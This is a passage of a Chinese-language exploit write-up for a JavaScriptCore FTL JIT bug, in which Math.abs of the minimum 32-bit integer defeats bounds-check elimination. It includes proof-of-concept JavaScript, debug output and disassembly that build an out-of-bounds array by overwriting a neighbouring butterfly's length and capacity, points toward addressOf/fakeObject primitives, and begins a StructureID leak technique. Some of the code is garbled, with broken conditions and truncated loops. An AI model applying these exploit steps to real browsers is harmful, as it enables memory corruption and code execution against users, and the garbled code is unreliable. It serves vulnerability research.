       if (n  2
    --> 2
    --> 2
    --> 2
    --> 2
    --> -2147483648
可以看到，这个值并不是`Math.abs(-0x80000000)`的准确值。
###  OOB数组构造
利用边界检查消除来进行数组的溢出
    function foo(arr,n) {
       if (n = 0) { //确定在边界之内
                return arr[idx]; //溢出
             }
          }
       }
    }
    var arr = [1.1,2.2,3.3];
    for (var i=0;i 1.5488838078e-314
    root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js
    --> undefined
这是因为漏洞最终发生在`FTL
JIT`，这个是延迟优化的，可能在执行最后的`debug(foo(arr,-0x80000000));`还没生成好JIT代码，因此具有微小的随机性，不影响漏洞利用。为了查看FTL
JIT的汇编代码，我们使用前面介绍的方法，对arr的`butterfly`下硬件断点，然后停下时将代码片段dump出来
    seg000:00007FFFAF10346F                 mov     ecx, eax
    seg000:00007FFFAF103471                 neg     ecx
    seg000:00007FFFAF103473                 mov     rdx, [rdx+8]
    seg000:00007FFFAF103477                 cmp     ecx, [rdx-8]
    seg000:00007FFFAF10347A                 jl      loc_7FFFAF103496
    seg000:00007FFFAF103480                 mov     dword ptr [rsi+737C1Ch], 1
    seg000:00007FFFAF10348A                 mov     rax, 0Ah
    seg000:00007FFFAF103491                 mov     rsp, rbp
    seg000:00007FFFAF103494                 pop     rbp
    seg000:00007FFFAF103495                 retn
    seg000:00007FFFAF103496 ; ---------------------------------------------------------------------------    seg000:00007FFFAF103496
    seg000:00007FFFAF103496 loc_7FFFAF103496:                       ; CODE XREF: seg000:00007FFFAF10347A↑j
    seg000:00007FFFAF103496                 test    ecx, 80000000h
    seg000:00007FFFAF10349C                 jnz     loc_7FFFAF1034E8
    seg000:00007FFFAF1034A2                 test    ecx, ecx
    seg000:00007FFFAF1034A4                 jns     loc_7FFFAF1034C0
    ................
    seg000:00007FFFAF1034E8 loc_7FFFAF1034E8:                       ; CODE XREF: seg000:00007FFFAF10349C↑j
    seg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003h
    seg000:00007FFFAF1034EF                 sub     ecx, eax
    seg000:00007FFFAF1034F1                 test    ecx, ecx
    seg000:00007FFFAF1034F3                 jns     loc_7FFFAF1034C0
    seg000:00007FFFAF1034F9                 jmp     loc_7FFFAF1034AA
    ................
    seg000:00007FFFAF1034C0 loc_7FFFAF1034C0:                       ; CODE XREF: seg000:00007FFFAF1034A4↑j
    seg000:00007FFFAF1034C0                                         ; seg000:00007FFFAF1034F3↓j
    seg000:00007FFFAF1034C0                 mov     eax, ecx
    seg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]
    seg000:00007FFFAF1034C7                 ucomisd xmm0, xmm0
    seg000:00007FFFAF1034CB                 jp      loc_7FFFAF1035A8
    seg000:00007FFFAF1034D1                 movq    rax, xmm0
    seg000:00007FFFAF1034D6                 sub     rax, rdi
    seg000:00007FFFAF1034D9                 mov     dword ptr [rsi+737C1Ch], 1
    seg000:00007FFFAF1034E3                 mov     rsp, rbp
    seg000:00007FFFAF1034E6                 pop     rbp
    seg000:00007FFFAF1034E7                 retn
从中可以看出，上述汇编代码正好印证了我们前面的分析，`neg ecx`代表了`Math.abs()`，然后`cmp ecx,
[rdx-8]`比较右边界，但由于ecx是32位，0x80000000比较通过，然后
    seg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003h
    seg000:00007FFFAF1034EF                 sub     ecx, eax
使得ecx为3，最后通过
    seg000:00007FFFAF1034C0                 mov     eax, ecx
    seg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]
进行数组溢出读取数据。那么我们可以用同样的方法，越界写改写下一个数组对象`butterfly`中的`length`和`capacity`，从而构造一个oob的数组对象。首先要在内存上布局三个相邻的数组对象
    arr0 ArrayWithDouble,
    arr1 ArrayWithDouble,
    arr2 ArrayWithContiguous,
通过arr0溢出改写arr1的`length`和`capacity`，即可将arr1构造为oob的数组
    var arr = [1.1,2.2,3.3];
    var oob_arr= [2.2,3.3,4.4];
    var obj_arr = [{},{},{}];
    debug(describe(arr));
    debug(describe(oob_arr));
    debug(describe(obj_arr));
    print();
发现三个数组的`butterfly`不相邻，并且类型不大对
    --> Object: 0x7fffef1a83e8 with butterfly 0x7fe00cee4010 (Structure 0x7fffae7f99e0:[0xee79, Array, {}, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049
    --> Object: 0x7fffef1a8468 with butterfly 0x7fe00cee4040 (Structure 0x7fffae7f99e0:[0xee79, Array, {}, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049
    --> Object: 0x7fffef1a84e8 with butterfly 0x7fe00cefda48 (Structure 0x7fffae7f9860:[0xe077, Array, {}, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 57463
前两个类型为`CopyOnWriteArrayWithDouble`，导致它们与arr2的`butterfly`不相邻，于是尝试这样构造
    let noCow = 13.37;
    var arr = [noCow,2.2,3.3];
    var oob_arr = [noCow,2.2,3.3];
    var obj_arr = [{},{},{}];
    debug(describe(arr));
    debug(describe(oob_arr));
    debug(describe(obj_arr));
    print();
    --> Object: 0x7fffef1a6168 with butterfly 0x7fe01e4fda48 (Structure 0x7fffae7f9800:[0xcd04, Array, {}, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484
    --> Object: 0x7fffef1a61e8 with butterfly 0x7fe01e4fda68 (Structure 0x7fffae7f9800:[0xcd04, Array, {}, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484
    --> Object: 0x7fffef1a6268 with butterfly 0x7fe01e4fda88 (Structure 0x7fffae7f9860:[0x5994, Array, {}, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 22932
这回就相邻了，然后我们利用前面的漏洞构造oob数组
    function foo(arr,n) {
       if (n = 0) { //确定在边界之内
                arr[idx] = 1.04380972981885e-310; //溢出
             }
          }
       }
    }
    let noCow = 13.37;
    var arr = [noCow,2.2,3.3];
    var oob_arr = [noCow,2.2,3.3];
    var obj_arr = [{},{},{}];
    for (var i=0;i 3
    root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js
    --> 3
    root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js
    --> 3
    root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js
    --> 4919
利用oob_arr和obj_arr即可轻松构造出addressOf和fakeObject原语
###  泄露StructureID
####  getByVal
在新版的JSC中，加入了StructureID随机化机制，使得我们前面介绍的喷射对象，并猜测StructureID的方法变得困难，成功率极大降低。因此需要使用其他方法，一种方法是利用`getByVal`，
    static ALWAYS_INLINE JSValue getByVal(VM& vm, JSGlobalObject* globalObject, CodeBlock* codeBlock, JSValue baseValue, JSValue subscript, OpGetByVal bytecode)
    {
       ..............................
        if (subscript.isUInt32()) {
           .......................
            } else if (baseValue.isObject()) {
                JSObject* object = asObject(baseValue);
                if (object->canGetIndexQuickly(i))
                    return object->getIndexQuickly(i);
其中`canGetIndexQuickly`源码如下
        bool canGetIndexQuickly(unsigned i) const
        {
            const Butterfly* butterfly = this->butterfly();
            switch (indexingType()) {
    ...............
            case ALL_DOUBLE_INDEXING_TYPES: {
                if (i >= butterfly->vectorLength())
                    return false;
                double value = butterfly->contiguousDouble().at(this, i);
                if (value != value)
                    return false;
                return true;
            }
    ............
        }
getIndexQuickly代码如下
        JSValue getIndexQuickly(unsigned i) const
        {
    .............
            case ALL_DOUBLE_INDEXING_TYPES:
                return JSValue(JSValue::EncodeAsDouble, butterfly->contiguousDouble().at(this, i));
    ...............
            }
        }
从上面可以知道`getIndexQuickly`这条路径不会使用到StructureID，那么如何触发`getByVal`呢？经过测试，发现对`不是数组类型`的对象，使用`[]`运算符可以触发到`getByVal`
    var a = {x:1};
    var b = a[0];
    debug(b);
    print();